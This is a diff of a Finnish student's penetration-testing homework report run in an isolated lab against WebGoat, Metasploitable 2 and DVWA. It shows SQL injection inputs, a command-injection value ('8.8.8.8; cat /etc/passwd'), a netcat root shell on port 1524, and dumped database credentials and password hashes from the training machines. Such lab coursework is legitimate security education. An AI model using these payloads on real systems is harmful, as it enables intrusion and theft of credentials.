@@ -11,9 +11,13 @@ Vieraita koneita ei saa porttiskannata, eikä vieraisiin koneisiin saa hyökät�
 
 ## z) Lue ja tiivistä. Tässä z-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen ja tiivistelmä riittää). Tiivistämiseen riittää muutama ranskalainen viiva.
 
-  * € Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a
-    Penetration Test Using Metasploit (kohdasta "Conducting a penetration test
-    with Metasploit" luvun loppuun)
+  * OWASP 10 A03:2021 - Injection  
+    - Hyökkääjä onnistuu injektoimaan omia kyselyitään tai koodiaan sovellukseen
+    - 94 % testatuista sovelluksistas löytyi jonkinlainen haavoittuvuus tässä luokassa
+    - Injektiohyökkäysten torjumiseksi:
+      + Käytä turvallisia API-toteutuksia
+      + Vahvista käyttäjäsyötteeet turvallisesti palvelimen puolelta
+
 
 Tee ja raportoi:
 
@@ -114,7 +118,88 @@ Tee ja raportoi:
         AND name LIKE '%u%'
         AND name NOT LIKE '% %'
     ```
-## b) Nyrkkeilysäkki. Asenna Metasploitable 2 samaan verkkoon Kalin kanssa. Katso, ettei haavoittuva Metasploitable 2 näy Internetiin.
+  
+## b) Ratkaise WebGoatista: A1 Injection (intro).
+  
+2. 
+Haluttu osasto saadaan yksinkertaisella koodilla:
+`SELECT department FROM employees WHERE last_name LIKE 'Franco' AND first_name LIKE 'Bob'`
+
+Vieläkin helpompi vaihtoehto olisi seuraava, jos tehtävän annossa olisi suoraan annettu käyttäjän userid:
+`SELECT deparment FROM employees WHERE userid=96134`  
+
+3. DML (Data Manipulation Language)
+Sisältää yleisimmät SQL komennot kuten SELECT, INSERT, UPDATE, DELETE jne. 
+
+CIA rikkomukset:
+Confidentiality, Integrity
+
+Ratkaisu:
+```
+UPDATE employees SET department = 'Sales' WHERE first_name LIKE 'Tobi' AND last_name LIKE 'Barnett'
+USERID FIRST_NAME LAST_NAME DEPARTMENT SALARY AUTH_TAN
+89762 Tobi Barnett Sales 77000 TA9LL1 
+``` 
+4. DDL (Data Definition Language)
+
+Tietokantaobjektien rakenteen luonti (CREATE), muokkaaminen (ALTER) ja pudottaminen (DROP)
+
+CIA rikkomukset:
+Integrity and Availability
+
+Ratkaisu:
+`ALTER TABLE employees ADD phone varchar(20);`
+
+5. DCL (Data Control Language)
+  
+Oikeuksien lisäämistä/korottamista tietokannan manipuliomiseksi.
+  
+Komennot kuten GRANT ja REVOKE.
+  
+CIA rikkomukset:  
+Confidentiality and Availability  
+  
+Solution:
+`GRANT ALTER TABLE TO 'UnauthorizedUser';`
+  
+9. Try It! String SQL injection
+
+Monivalintatehtävä:
+"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith or 1=1';  
+  
+10. 
+Aluksi yritin laittaa NaN arvon Login_Count kenttään:
+`Could not parse: sdfwdf to a number`
+Tämä lienee suojattu.  
+
+Onnistunut kysely:
+```
+Login_Count = 0
+userid = 0 OR 1=1 
+``` 
+  
+11. Confidentiality (Get access to salaries)
+
+Aluksi katsoin vain, miltä John Smithin tiedot näyttävät:
+Input:  
+```
+Name: Smith
+TAN: 3SL99A
+```
+SQL kysely johon injektio pitää tehdä:
+`"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';`
+```
+Input: Demon' OR 'a'='a
+TAN: 3SL99A' OR 'a'='a
+```
+Sijoitetaan:
+`"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';`
+
+Onnistui.  
+  
+<img src="Screenshots/webgoatSQl1-11.png">  
+  
+## c) Nyrkkeilysäkki. Asenna Metasploitable 2 samaan verkkoon Kalin kanssa. Katso, ettei haavoittuva Metasploitable 2 näy Internetiin.
   
 1. Asennustiedoston lataus ja purku.  
   Latasin Metasploitable 2 zip -pakatun tiedoston osoitteesta: https://sourceforge.net/projects/metasploitable/files/latest/download  
@@ -184,7 +269,7 @@ Tee ja raportoi:
   Näyttäisi toimivan ja koneet ovat siis samassa verkossa.  
 
 
-## c) Nauhalle. Nauhoita kaikki konsolissa annetut asiat ja näkyvät tulosteet koko tehtävästä. (esim script)  
+## d) Nauhalle. Nauhoita kaikki konsolissa annetut asiat ja näkyvät tulosteet koko tehtävästä. (esim script)  
   
 Päätin käyttää script -sovellusta, joka tulee esiasennettuna ainakin omiin käyttöjärjestelmä versiohini.  
 Testi:  
@@ -235,14 +320,14 @@ Script done on 2022-04-09 06:16:20-04:00 [COMMAND_EXIT_CODE="0"]
   
 Näyttäisi toimivan.  
 
-## d) Ei kuulu! Ennenkuin aloitat skannaukset, kokeile, ettei Kali pääse nettiin 'ping 8.8.8.8' vastaa "Network is unreachable".  
+## e) Ei kuulu! Ennenkuin aloitat skannaukset, kokeile, ettei Kali pääse nettiin 'ping 8.8.8.8' vastaa "Network is unreachable".  
  ``` 
   ┌──(pajazzo㉿kali)-[~]
   └─$ ping 8.8.8.8                                                                          
   ping: connect: Network is unreachable
   ```
   
-## e) Piilosilla. Etsi Metasploitable 2 verkkoskannauksella. Tarkista ensin, että osoitteet ovat uskottavia (ipcalc 10.0.0.1/23). Sitten ping sweep (nmap -sn). Analysoi tulokset, eli selitä, mitä mikäkin asia tulosteessa tarkoittaa. Mitä päättelet eri koneista?  
+## f) Piilosilla. Etsi Metasploitable 2 verkkoskannauksella. Tarkista ensin, että osoitteet ovat uskottavia (ipcalc 10.0.0.1/23). Sitten ping sweep (nmap -sn). Analysoi tulokset, eli selitä, mitä mikäkin asia tulosteessa tarkoittaa. Mitä päättelet eri koneista?  
 
 Tarkistin ensin mistä verkosta lähdetään hakemaan tietokoneita ip a (a = address)-komennolla:   
 ```
@@ -307,7 +392,7 @@ Lähteet:
 Understanding CIDR subnet mask notation, https://docs.netgate.com/pfsense/en/latest/network/cidr.html
 Find all devices connected to local network using nmap, https://lindevs.com/find-all-devices-connected-to-local-network-using-nmap/
   
-## f) Kilo. Porttiskannaa 1000 tavallisinta porttia löydetyistä koneista. Selitä ja analysoi tulokset. Mikä koneista voisi olla Metasploitable 2?
+## g) Kilo. Porttiskannaa 1000 tavallisinta porttia löydetyistä koneista. Selitä ja analysoi tulokset. Mikä koneista voisi olla Metasploitable 2?
   
 Lähdin kokeilemaan nmap skannausta käyttämättä mitään vipuja jolloin nmap skannaa 1000 yleisintä porttia annetuista kohteista:  
 ```
@@ -366,7 +451,7 @@ Kolmas skannattu kone taas näyttää olevan reikäjuustoa, mitä tulee avoimiin
 Mahdollinen kohde tunnistettu koneeksi:  
 192.168.56.8  
   
-## g) Ja tiskiallas. Porttiskannaa Metasploitable 2 perusteellisesti. Selitä ja analysoi tulokset. Selitä kustakin avoimesta portista, mikä palvelu siinä on /mihin se on tarkoitettu, onko se tavallisesti näkyvissä Internetiin ja onko se nykyiaikainen. Voit myös arvioida, onko versio päivitetty.  
+## h) Ja tiskiallas. Porttiskannaa Metasploitable 2 perusteellisesti. Selitä ja analysoi tulokset. Selitä kustakin avoimesta portista, mikä palvelu siinä on /mihin se on tarkoitettu, onko se tavallisesti näkyvissä Internetiin ja onko se nykyiaikainen. Voit myös arvioida, onko versio päivitetty.  
   
 Olen tehnyt tästä samasta koneesta jo kattavan (-Av) porttianalyysin edellisellä [kurssilla](https://github.com/pajaz/DataSecurityCourse2022/blob/main/Homework/Lesson4.md#b-punchbag-install-metasploitable-2-practice-target-on-virtual-box-and-only-connect-it-to-your-new-virtual-network-login-to-metasploitable-2-and-find-out-its-ip-address).  
 Käytin tähän tehtävään vähän kevyempää metodia -sV, joka skannaa kohteen portit ja pyrkii ilmoittamaan niissä elävän palvelun nimen ja version. Lähde: https://nmap.org/book/man-version-detection.html  
@@ -438,9 +523,125 @@ Portti | Palvelu | Versio | Kommentit | Exploit
 6667/tcp | irc | UnrealIRCd | Internet Relay Chat ja UnrealIRCd sen yksi tunnetuimmista demoneista. | Voidaan mahdollisesti käyttää tiedostojen siirtoon onnistuneen hyökkäyksen jälkeen.  
 8009/tcp | ajp13 | Apache Jserv (Protocol v1.3) | Apache Tomcatiin liittyvä binäärimuodossa dataa lähettävä protokolla (https://tomcat.apache.org/connectors-doc-archive/jk2/common/AJPv13.html) | 
 8180/tcp | http | Apache Tomcat/Coyote JSP engine 1.1 | Apache Tomcat http-portissa. | **Vieraile 192.168.56.8:8081** curl -l 192.168.56.8:8081, josko headereistä saisi versionumeron.  
+   
+## i) Ovi jäi auki. Mitä löytyy portista 1524/tcp? Kokeile netcattilla 'nc'.  
+```
+┌──(pajazzo㉿kali)-[~]
+└─$ nc 192.168.56.8 1524
+root@metasploitable:/# whoami
+root
+```
+Root-shelli jäänyt vahingossa auki porttiin 1524 eli tuota kautta saa periaatteessa vapaat kädet koneelle.  
   
-## h) Sataa simpukoita. Tunkeudu vsftpd-palveluun.  
+## j) Darn Low Security. Etsi Metasploitable 2 weppipalvelin. Tee paikallinen tunnus DVWA Damn Vulnerable Web App -ohjelmaan. Aseta vasemman reunan palkista "DVWA Security" Low.
+ 
+DVWA sovellus löytyy Metasploitable 2 palvelimelta osoitteesta:   
+http://192.168.56.8/dvwa
+Tämän löysin ihan testaamalla.  
+Sovelluksessa ei näyttäisi olevan mahdollisuutta luoda käyttäjiä ainakaan selain käyttöliittymän kautta, joten tehdään tunnus suoraan tietokantaan. Aiemmin sain jo muodostettua ssh-yhteyden demon käyttäjälläni Metasploitable 2 koneelle, joten otetaan ssh-yhteys uudelleen käyttöön. 
+Tässä jouduin vähän hakemaan tietoa Internetistä eli DVWL -asennusohje sivulta https://opensourcelibs.com/lib/dvwa, jossa mainitaan sovelluksen config tiedoston sijainti, joka pitää sisällään sovelluksen tietokanta -konfiguraation.  
+```
+demon@metasploitable:~$ sudo cat /var/www/dvwa/config/config.inc.php 
+[sudo] password for demon: 
+<?php
+
+# If you are having problems connecting to the MySQL database and all of the variables below are correct
+# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
+# Thanks to digininja for the fix.
+
+# Database management system to use
+
+$DBMS = 'MySQL';
+#$DBMS = 'PGSQL';
+
+# Database variables
+
+$_DVWA = array();
+$_DVWA[ 'db_server' ] = 'localhost';
+$_DVWA[ 'db_database' ] = 'dvwa';
+$_DVWA[ 'db_user' ] = 'root';
+$_DVWA[ 'db_password' ] = '';
+
+# Only needed for PGSQL
+$_DVWA[ 'db_port' ] = '5432'; 
+
+?>
+```
+Tästä selvisi siis, että sovellus käyttää mySQL tietokantaa, tietokannan nimi on dvwa, tunnus root ja ei salasanaa.  
+Jatkoin ottamalla yhteyden tietokantaan:  
+```
+demon@metasploitable:~$ mysql -u root -D dvwa     ## -u käyttäjä -D tietokanta
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 18
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql> show tables;                                                                                               
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      | 
+| users          | 
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from users;                                                                                       
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+| user_id | first_name | last_name | user    | password                         | avatar                                                |
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
+|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
+|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
+|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
+|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+6 rows in set (0.01 sec)
+```
+Mielenkiintoista. Kahdella käyttäjällä näkyisi olevan täysin sama salasana ja itseasiassa tiedänkin sen, koska adminin salasana mainitaan DVWAn asennussivulla. Se on 'password', joka näyttäisi tässä olevan kryptattuna. Hakukoneella selviää, että tuo on MD5 salauksen hash kyseiselle salasanalle (https://md5hashing.net/hash/md5/5f4dcc3b5aa765d61d8327deb882cf99). Loin oman käyttäjän tietokantaan ja laitoin sille saman salasanan, koska en jaksanut alkaa kryptaamaan uutta:  
+```
+mysql> INSERT INTO users (user_id, first_name, last_name, user, password) VALUES (6, 'M', 'P', 'demon', '5f4dcc3b5aa765d61d8327deb882cf99');
+Query OK, 1 row affected (0.00 sec)
+
+mysql> select * from users;                                                                                        
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+| user_id | first_name | last_name | user    | password                         | avatar                                                |
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
+|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
+|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
+|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
+|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
+|       6 | M          | P         | demon   | 5f4dcc3b5aa765d61d8327deb882cf99 | NULL                                                  | 
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+7 rows in set (0.00 sec)
+```
+Ja testaamaan kirjautumista, joka onnistui mainiosti:  
+<img src="Screenshots/dvwaDemonIn.png">
+
+
+## k) Execute! Ratkaise DVWA "Command Excution". ("DVWA Security" on paras olla "Low")
+Syöte:
+8.8.8.8; cat /etc/passwd
+
+Tämä palautti minulle koko Metasploitable 2 koneen käyttäjälistan ja ryhmät. Yritin myös saada /etc/shadow tiedoston sisältöä, mutta ilmeisesti sudo oikeuksia sovelluksella ei ole, koska sudo cat /etc/shadow ei palauttanut mitään.  
+En oikein tiedä, mikä tässä tehtävässä katsotaan "Ratkaistuksi".  
   
+## l) Asenna jokin kone Vulnhub:ista samaan Internetistä eristettyyn verkkoon Kalin kanssa.
+  
+Valitsin koneeksi https://www.vulnhub.com/entry/corrosion-1,730/, joka kuvauksen mukaan pitäisi olla helppo kone aloittelijoille.  
+Asensin sen VirtualBoxiin ladatulla .ova tiedostolla Import Appliance valikon kautta. 
+Asennuksen jälkeen liitin sen koneen Settings > Network valikosta Host-Only adapteriin, jossa myös Kali Linuxini on.  
+
+<img src="Screenshots/corrosion1Installed.png">  
+  
+## m) Skannaa Vulnhubista hakemasi kone, ja analysoi tulokset.
+
+## n) Vapaaehtoinen: Murtaudu jollain uudella tavalla Metasploitable 2:n.  
+
 Aloitin tunkeutumisen avaamalla komentoriviltä Kali Linuxin mukana tulleen toolkitin msfconsole josta löytyy useita valmiita exploitteja.  
 Tämän jälkeen etsin msfconsolesta haluamani exploitin, käynnistin sen, asetin RHOSTiksi kohde koneen IP-osoitteen 192.168.56.8.  
 Varmistin vielä, että tiedot päivittyivät oikein, minkä jälkeen käynnistyn exploitin.
@@ -709,125 +910,6 @@ Käyttäjä | Ryhmät | Kommentti
 demon | admin sudo | Sudo-oikeudet
 demon2 | admin | Sudo-oikeudet
 demon3 | sudo | Ei sudo-oikeuksia
-  
-## i) Ovi jäi auki. Mitä löytyy portista 1524/tcp? Kokeile netcattilla 'nc'.  
-```
-┌──(pajazzo㉿kali)-[~]
-└─$ nc 192.168.56.8 1524
-root@metasploitable:/# whoami
-root
-```
-Root-shelli jäänyt vahingossa auki porttiin 1524 eli tuota kautta saa periaatteessa vapaat kädet koneelle.  
-  
-## j) Darn Low Security. Etsi Metasploitable 2 weppipalvelin. Tee paikallinen tunnus DVWA Damn Vulnerable Web App -ohjelmaan. Aseta vasemman reunan palkista "DVWA Security" Low.
- 
-DVWA sovellus löytyy Metasploitable 2 palvelimelta osoitteesta:   
-http://192.168.56.8/dvwa
-Tämän löysin ihan testaamalla.  
-Sovelluksessa ei näyttäisi olevan mahdollisuutta luoda käyttäjiä ainakaan selain käyttöliittymän kautta, joten tehdään tunnus suoraan tietokantaan. Aiemmin sain jo muodostettua ssh-yhteyden demon käyttäjälläni Metasploitable 2 koneelle, joten otetaan ssh-yhteys uudelleen käyttöön. 
-Tässä jouduin vähän hakemaan tietoa Internetistä eli DVWL -asennusohje sivulta https://opensourcelibs.com/lib/dvwa, jossa mainitaan sovelluksen config tiedoston sijainti, joka pitää sisällään sovelluksen tietokanta -konfiguraation.  
-```
-demon@metasploitable:~$ sudo cat /var/www/dvwa/config/config.inc.php 
-[sudo] password for demon: 
-<?php
-
-# If you are having problems connecting to the MySQL database and all of the variables below are correct
-# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
-# Thanks to digininja for the fix.
-
-# Database management system to use
-
-$DBMS = 'MySQL';
-#$DBMS = 'PGSQL';
-
-# Database variables
-
-$_DVWA = array();
-$_DVWA[ 'db_server' ] = 'localhost';
-$_DVWA[ 'db_database' ] = 'dvwa';
-$_DVWA[ 'db_user' ] = 'root';
-$_DVWA[ 'db_password' ] = '';
-
-# Only needed for PGSQL
-$_DVWA[ 'db_port' ] = '5432'; 
-
-?>
-```
-Tästä selvisi siis, että sovellus käyttää mySQL tietokantaa, tietokannan nimi on dvwa, tunnus root ja ei salasanaa.  
-Jatkoin ottamalla yhteyden tietokantaan:  
-```
-demon@metasploitable:~$ mysql -u root -D dvwa     ## -u käyttäjä -D tietokanta
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 18
-Server version: 5.0.51a-3ubuntu5 (Ubuntu)
-
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-mysql> show tables;                                                                                               
-+----------------+
-| Tables_in_dvwa |
-+----------------+
-| guestbook      | 
-| users          | 
-+----------------+
-2 rows in set (0.00 sec)
-
-mysql> select * from users;                                                                                       
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-| user_id | first_name | last_name | user    | password                         | avatar                                                |
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
-|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
-|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
-|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
-|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-6 rows in set (0.01 sec)
-```
-Mielenkiintoista. Kahdella käyttäjällä näkyisi olevan täysin sama salasana ja itseasiassa tiedänkin sen, koska adminin salasana mainitaan DVWAn asennussivulla. Se on 'password', joka näyttäisi tässä olevan kryptattuna. Hakukoneella selviää, että tuo on MD5 salauksen hash kyseiselle salasanalle (https://md5hashing.net/hash/md5/5f4dcc3b5aa765d61d8327deb882cf99). Loin oman käyttäjän tietokantaan ja laitoin sille saman salasanan, koska en jaksanut alkaa kryptaamaan uutta:  
-```
-mysql> INSERT INTO users (user_id, first_name, last_name, user, password) VALUES (6, 'M', 'P', 'demon', '5f4dcc3b5aa765d61d8327deb882cf99');
-Query OK, 1 row affected (0.00 sec)
-
-mysql> select * from users;                                                                                        
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-| user_id | first_name | last_name | user    | password                         | avatar                                                |
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
-|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
-|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
-|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
-|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
-|       6 | M          | P         | demon   | 5f4dcc3b5aa765d61d8327deb882cf99 | NULL                                                  | 
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-7 rows in set (0.00 sec)
-```
-Ja testaamaan kirjautumista, joka onnistui mainiosti:  
-<img src="Screenshots/dvwaDemonIn.png">
-
-
-## k) Execute! Ratkaise DVWA "Command Excution". ("DVWA Security" on paras olla "Low")
-Syöte:
-8.8.8.8; cat /etc/passwd
-
-Tämä palautti minulle koko Metasploitable 2 koneen käyttäjälistan ja ryhmät. Yritin myös saada /etc/shadow tiedoston sisältöä, mutta ilmeisesti sudo oikeuksia sovelluksella ei ole, koska sudo cat /etc/shadow ei palauttanut mitään.  
-En oikein tiedä, mikä tässä tehtävässä katsotaan "Ratkaistuksi".  
-  
-## l) Asenna jokin kone Vulnhub:ista samaan Internetistä eristettyyn verkkoon Kalin kanssa.
-  
-Valitsin koneeksi https://www.vulnhub.com/entry/corrosion-1,730/, joka kuvauksen mukaan pitäisi olla helppo kone aloittelijoille.  
-Asensin sen VirtualBoxiin ladatulla .ova tiedostolla Import Appliance valikon kautta. 
-Asennuksen jälkeen liitin sen koneen Settings > Network valikosta Host-Only adapteriin, jossa myös Kali Linuxini on.  
-
-<img src="Screenshots/corrosion1Installed.png">  
-  
-  
-## m) Skannaa Vulnhubista hakemasi kone, ja analysoi tulokset.
-
-## n) Vapaaehtoinen: Murtaudu jollain uudella tavalla Metasploitable 2:n.
 
 ## o) Vapaaehtoinen: Murtaudu Vulnhubista lataamaasi kuvaan.
 
